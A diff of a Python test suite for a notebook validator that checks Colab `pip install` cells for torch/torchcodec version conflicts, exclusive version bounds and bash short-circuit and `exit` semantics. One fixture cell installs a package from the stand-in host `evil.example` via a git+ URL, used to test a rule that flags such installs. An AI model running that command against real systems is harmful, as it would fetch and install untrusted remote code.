@@ -399,13 +399,30 @@ def test_notebook_validator_keeps_or_fallbacks_visible_to_other_rules():
 
 
 def test_notebook_validator_will_not_name_an_exclusive_floor():
-    """`>V` names the one version pip will not install, so on its own it says the install
-    moved but not where. Only a ceiling that pins the minor can answer that."""
+    """`>V` says the install moved but not where: only a ceiling that pins the minor answers
+    that. The bound is still KEPT, as inexact, so a check that has to hold over the whole
+    admitted range can run; discarding it silenced the rule outright."""
     nv = _load_notebook_validator_module()
 
     for cell in ('!pip install "torch>2.12"', '!pip install "torch>2.11.999"'):
-        assert nv._effective_version(cell, "torch", "2.11.0+cu128") == (None, True), cell
-        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell
+        version, exact = nv._effective_version(cell, "torch", "2.11.0+cu128")
+        assert exact is False, cell  # never read as the version pip landed on
+        assert version is not None, cell
+    # Above 2.12 nothing pairs with the image's codec 0.11, which holds for every release the
+    # bound admits, so the finding does not depend on naming one.
+    assert [
+        f.rule
+        for f in nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torch>2.12"', COLAB_TORCH211, "nb.ipynb", 0
+        )
+    ] == ["R-INST-004"]
+    # 2.11.999 still admits the 2.11 line the image's codec pairs with, so nothing is proven.
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torch>2.11.999"', COLAB_TORCH211, "nb.ipynb", 0
+        )
+        == []
+    )
 
     # `>=` still names its endpoint, which is what the earlier rounds rest on.
     assert nv._effective_version('!pip install "torch>=2.12"', "torch", "2.11.0+cu128") == (
@@ -606,9 +623,10 @@ def test_notebook_validator_moves_off_an_exclusive_endpoint():
     nv = _load_notebook_validator_module()
 
     on_the_endpoint = {"torch": "2.11.0+cu128", "torchcodec": "0.8.0"}
+    # Inexact: the bound survives so range checks can run, but it never reads as the landing.
     assert nv._effective_version('!pip install "torchcodec>0.8.0"', "torchcodec", "0.8.0") == (
-        None,
-        True,
+        "0.8.0",
+        False,
     )
     assert (
         nv.rule_inst_004_torchcodec_torch(
@@ -771,8 +789,8 @@ def test_notebook_validator_keeps_the_stricter_of_two_equal_floors():
     for spelling in ("torchcodec>=0.8.0,>0.8.0", "torchcodec>0.8.0,>=0.8.0"):
         assert nv._spec_window(nv.parse_spec(spelling).pins)[5] is True, spelling
         assert nv._effective_version(f'!pip install "{spelling}"', "torchcodec", "0.8.0") == (
-            None,
-            True,
+            "0.8.0",
+            False,
         ), spelling
 
     # Two inclusive floors still name the endpoint.
@@ -2359,12 +2377,12 @@ def test_an_exclusive_ceiling_names_the_minor_pip_moves_to():
 
 def test_a_strict_lower_bound_excludes_the_installed_version():
     """`>0.11.0` rules out the 0.11.0 the image ships, and which release pip picks instead is
-    only in the index, so nothing names the landing and the rule declines to judge."""
+    only in the index, so the bound comes back inexact and the rule declines to judge."""
     from scripts import notebook_validator as nv
 
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
     cell = '!pip install torch==2.12.0 "torchcodec>0.11.0"'
-    assert nv._effective_version(cell, "torchcodec", "0.11.0") == (None, True)
+    assert nv._effective_version(cell, "torchcodec", "0.11.0") == ("0.11.0", False)
     assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == []
 
     # A strict bound the installed version already clears leaves it alone.
@@ -3992,3 +4010,99 @@ def test_a_body_whose_test_can_never_succeed_runs_nothing():
         ("!maybe", False),
         ("!pip install a", True),
     ]
+
+
+def test_fallback_reachability_folds_the_whole_left_hand_list():
+    """`||` and `&&` are left-associative, so the operand is the list, not the nearest piece.
+
+    Verified against bash: `true || false || echo RAN` prints nothing, `false && true || echo
+    RAN` prints. Reading only the piece beside the operator got both backwards -- inventing an
+    install the notebook skips, and hiding one it always performs.
+    """
+    nv = _load_notebook_validator_module()
+
+    # `(true || false)` succeeded, so the second `||` skips its tail.
+    assert list(nv.unconditional_pip_invocations("!true || false || pip install torch==2.12.0")) == []
+    # `(false && true)` failed, so the tail always runs.
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations("!false && true || pip install torch==2.12.0")
+    ] == [("install", ["torch==2.12.0"])]
+    # Every list that folds to a certain failure, however it is spelled. `false && maybe`
+    # short-circuits, and `maybe && false` fails whichever way `maybe` goes, so both reach the
+    # tail unconditionally -- which reading the nearest piece alone could not tell.
+    for cell in (
+        "!false || false || pip install a",
+        "!true && false || pip install a",
+        "!false && maybe || pip install a",
+        "!maybe && false || pip install a",
+    ):
+        assert [
+            (inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(cell)
+        ] == [("install", ["a"])], cell
+    # An unknown the fold cannot resolve keeps the tail conditional.
+    for cell in ("!true && maybe || pip install a", "!maybe || false || pip install a"):
+        assert list(nv.unconditional_pip_invocations(cell)) == [], cell
+
+
+def test_an_unconditional_exit_ends_the_command_list():
+    """`exit` terminates the shell as definitively as a successful `exec`.
+
+    Verified against bash: `exit 0; echo RAN` prints nothing. Only `exec` was recognised, so
+    R-INST-001 and the compatibility rules fired on an install bash never reaches.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!exit 0; pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    assert nv._split_chained("!exit; pip install a") == [("!exit", False)]
+    # `env exit 0` asks env for a program called exit, which does not exist; a subshell exit
+    # and a conditional one leave the parent shell running. All three verified against bash.
+    for cell in (
+        "!env exit 0; pip install a",
+        "!(exit 0); pip install a",
+        "!exit 0 | cat; pip install a",
+        "!false && exit 0; pip install a",
+    ):
+        assert "!pip install a" in [text for text, _ in nv._split_chained(cell)], cell
+
+
+def test_a_colab_prerelease_python_keeps_its_suffix():
+    """pip skips `python_full_version >= "3.13.0"` on 3.13.0rc1; truncating to 3.13.0 replayed
+    requirements the image never installs."""
+    nv = _load_notebook_validator_module()
+
+    for line, expected in (
+        ("Python 3.13.15", "3.13.15"),
+        ("Python 3.13.0rc1", "3.13.0rc1"),
+        ("Python 3.14rc1", "3.14rc1"),
+        ("Python 3.13.0.dev3", "3.13.0.dev3"),
+    ):
+        assert nv._COLAB_PYTHON_RE.search(line + "\n").group(1) == expected, line
+    # A truncated value can no longer be acknowledged as a usable strict key either.
+    assert nv._strict_key_usable("os-info-gpu.txt", "python", {"python": "3.13.0rc1"}) is True
+    assert nv._strict_key_usable("os-info-gpu.txt", "python", {"python": "(unknown)"}) is False
+
+
+def test_an_exclusive_floor_is_kept_as_an_inexact_bound():
+    """`>V` excludes V, but discarding the bound stopped whole-range checks running at all.
+
+    With Colab's torch 2.11 and torchcodec 0.10, `pip install "torch>2.11"` must move torch to
+    a release no 0.10 pairs with, and the equivalent `torch>=2.11.1` was already reported.
+    """
+    nv = _load_notebook_validator_module()
+
+    codec_010 = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128"}
+    for cell in ('!pip install "torch>2.11"', '!pip install "torch>=2.11.1"'):
+        assert [
+            f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, codec_010, "nb.ipynb", 0)
+        ] == ["R-INST-004"], cell
+    # Inexact, so it is never read as the release pip landed on.
+    assert nv._effective_version('!pip install "torch>2.11"', "torch", "2.11.0+cu128") == (
+        "2.11",
+        False,
+    )
